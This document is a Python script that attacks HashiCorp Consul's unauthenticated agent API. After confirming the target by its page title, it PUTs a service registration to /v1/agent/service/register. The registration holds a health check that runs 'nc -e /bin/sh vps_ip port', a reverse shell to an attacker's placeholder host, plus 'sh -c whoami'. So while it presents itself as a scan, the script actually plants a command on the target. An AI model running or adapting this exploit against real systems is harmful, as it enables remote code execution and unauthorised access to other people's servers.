import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if '<title>Consul by HashiCorp</title>' in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+'v1/agent/service/register'
	headers={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Content-type":"application/json",
	}
	body='''
{\r
    "ID": "bpPeMfZuAN",\r
    "Name": "bpPeMfZuAN",\r
    "Address":"127.0.0.1",\r
    "Port":80,\r
    "check":{\r
                "script":"nc -e /bin/sh vps_ip port",\r
                "Args": ["sh", "-c","whoami"],\r
                "interval":"10s",\r
                "Timeout":"86400s"\r
    }\r
}\r
	'''
	response=requests.put(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code==200:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False

